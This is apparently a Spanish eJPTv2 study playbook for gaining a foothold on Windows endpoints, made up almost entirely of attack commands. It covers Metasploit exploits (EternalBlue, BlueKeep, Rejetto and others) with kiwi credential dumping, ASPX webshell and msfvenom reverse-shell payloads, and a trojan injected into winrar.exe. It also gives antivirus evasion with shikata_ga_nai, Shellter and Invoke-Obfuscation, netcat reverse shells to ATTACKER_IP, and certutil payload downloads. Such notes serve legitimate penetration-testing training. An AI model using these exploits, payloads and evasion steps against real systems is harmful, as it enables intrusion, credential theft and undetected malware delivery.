# 💥 PLAYBOOK 4 — FOOTHOLD: EXPLOTACIÓN WINDOWS

> **Objetivo:** Obtener acceso inicial a endpoints Windows mediante vulnerabilidades conocidas.
> **Fuente:** Guia_eJPTv2_TFM — Carpetas 04/Windows, 05, 08

---

## 4.1 — Vulnerabilidades Conocidas Windows

### 4.1.1 EternalBlue (MS17-010) — SMB
```bash
# Detección
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>

# MSF — Scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# MSF — Exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set payload windows/x64/meterpreter/reverse_tcp
run
```

#### AutoBlue (sin Metasploit)
```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install -r requirements.txt
cd shellcode && chmod +x shell_prep.sh && ./shell_prep.sh
# Configurar LHOST y LPORT
nc -nvlp <LPORT>                                              # Listener
python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
```

### 4.1.2 BlueKeep (CVE-2019-0708) — RDP
```bash
# MSF — Scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <TARGET_IP>
run

# MSF — Exploit (¡Puede causar kernel crash!)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
show targets
set target <NUMBER>
set GROOMSIZE 50
run
```

### 4.1.3 Heartbleed — SSL/TLS
```bash
nmap -sV --script ssl-enum-ciphers -p <SECURED_PORT> <TARGET_IP>
nmap -sV --script ssl-heartbleed -p 443 <TARGET_IP>
```

### 4.1.4 Log4j — Java
```bash
nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_IP>:1389 -p 8080 <TARGET_IP>
```

### 4.1.5 BadBlue 2.7 — HTTP
```bash
msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS <TARGET_IP>
exploit
```

### 4.1.6 Rejetto HFS 2.3.x — HTTP
```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <TARGET_IP>
exploit
```

### 4.1.7 Icecast — HTTP Streaming
```bash
use exploit/windows/http/icecast_header
set RHOSTS <TARGET_IP>
exploit

# Post-explotación
sysinfo
run post/multi/recon/local_exploit_suggester
getprivs
migrate -N spoolsv.exe
load kiwi
creds_all
```

---

## 4.2 — Explotación vía SMB (Windows)

### Acceso con credenciales
```bash
smbclient -L //<TARGET_IP> -N                     # Null session
smbclient //<TARGET_IP>/<SHARE> -U '<USER>'
smbmap -H <TARGET_IP> -u '<USER>' -p '<PASS>'

# Subir/descargar archivos
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/backdoor' 'C$\backdoor'
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
```

---

## 4.3 — Explotación IIS + ASPX (Windows)

### Método 1: Webshell ASPX via FTP
```bash
# Encontrar cmdasp.aspx
find / -name cmdasp.aspx 2>/dev/null
cp /usr/share/webshells/aspx/cmdasp.aspx .

# Subir vía FTP
ftp <TARGET_IP>
put cmdasp.aspx

# Ejecutar en navegador: http://<TARGET_IP>/cmdasp.aspx
```

### Método 2: Payload msfvenom + FTP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=444 -f aspx -o shell.aspx
ftp <TARGET_IP>
put shell.aspx

# Listener MSF
msfconsole
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 444
run
# Navegar a http://<TARGET_IP>/shell.aspx
```

### Método 3: SMB Share + nc.exe
```bash
cp /usr/share/windows-resources/binaries/nc.exe .
impacket-smbserver recurso $(pwd) -smb2support
sudo nc -nvlp 443

# En la webshell ejecutar:
\\<ATTACKER_IP>\recurso\nc.exe -e cmd.exe <ATTACKER_IP> 443
```

---

## 4.4 — Explotación RDP (Windows)

```bash
# Conexión con credenciales
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP>

# Enumeración interna Windows
net user
net user <USERNAME>
net localgroup Administrators
```

---

## 4.5 — Payloads msfvenom (Windows)

```bash
# Windows 32bit
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > payload.exe

# Windows 64bit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o payload.exe

# ASPX (IIS)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o shell.aspx

# Encoded (evasión AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe > payload_enc.exe

# Inyectar en ejecutable legítimo
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 10 -f exe -x winrar.exe > trojan.exe
```

---

## 4.6 — Ofuscación y Evasión AV

### Shellter (inyección en PE 32-bit)
```bash
sudo apt install shellter -y
cp /usr/share/windows-binaries/vncviewer.exe .
sudo wine shellter.exe
# A (auto) → ruta al .exe → Y → L → 1 → LHOST → LPORT

# Servir y escuchar
python3 -m http.server 80
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
run
```

### Invoke-Obfuscation (PowerShell)
```bash
git clone https://github.com/danielbohannon/Invoke-Obfuscation
sudo apt install powershell -y
pwsh
Import-Module ./Invoke-Obfuscation
SET SCRIPTPATH /ruta/reverse.ps1
AST → ALL → 1
# Copiar código ofuscado a reverse.ps1

python3 -m http.server 80
nc -nvlp <LPORT>
```

---

## 4.7 — Transferencia de Archivos (Windows)

```bash
# En el atacante — servir archivos
python3 -m http.server 80
impacket-smbserver recurso $(pwd) -smb2support

# En la víctima Windows — descargar
certutil -urlcache -f http://<ATTACKER_IP>/payload.exe payload.exe
copy \\<ATTACKER_IP>\recurso\payload.exe payload.exe
```
